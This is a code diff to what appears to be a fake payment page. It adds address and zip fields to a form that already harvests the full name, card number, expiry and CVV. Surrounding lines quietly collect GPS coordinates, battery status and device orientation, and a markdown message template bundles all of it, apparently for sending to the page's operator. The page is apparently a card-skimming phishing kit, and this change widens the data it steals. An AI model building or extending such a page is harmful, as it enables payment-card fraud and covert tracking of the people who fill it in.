@@ -74,6 +74,12 @@
             <label for="full-name" class="text-sm text-gray-300">Full Name:</label>
             <input type="text" id="full-name" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="John Doe" required />
 
+            <label for="address" class="text-sm text-gray-300 mt-4 block">Address:</label>
+            <input type="text" id="address" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="123 Main St, Apt 4B" required />
+
+            <label for="zip" class="text-sm text-gray-300 mt-4 block">Post / Zip Code:</label>
+            <input type="text" id="zip" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="90210" required />
+
             <label for="card-number" class="text-sm text-gray-300 mt-4">Card Number:</label>
             <input type="text" id="card-number" class="w-full p-3 mt-2 bg-gray-800 border border-gray-600 rounded-lg text-white focus:outline-none" placeholder="1234 5678 9876 5432" required />
 
@@ -131,7 +137,6 @@
         navigator.getBattery ? navigator.getBattery() : Promise.resolve({})
       ]);
 
-      // Try to get GPS coordinates
       const coords = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           pos => resolve({
@@ -143,7 +148,6 @@
         );
       });
 
-      // Device orientation
       const orientation = {
         tiltX: 'N/A',
         tiltY: 'N/A',
@@ -188,6 +192,8 @@
 🧾 **Order Info**
 - Method: ${paymentMethod}
 - Name: ${formData.fullName || 'N/A'}
+- Address: ${formData.address || 'N/A'}
+- Zip Code: ${formData.zip || 'N/A'}
 - Card: ${formData.cardNumber || 'N/A'}
 - Expiry: ${formData.expiry || 'N/A'}
 - CVV: ${formData.cvv || 'N/A'}
@@ -229,6 +235,8 @@
       const paymentMethod = document.querySelector('input[name="payment-method"]:checked').id;
       const formData = {
         fullName: document.getElementById('full-name').value,
+        address: document.getElementById('address').value,
+        zip: document.getElementById('zip').value,
         cardNumber: document.getElementById('card-number').value,
         expiry: document.getElementById('expiry').value,
         cvv: document.getElementById('cvv').value
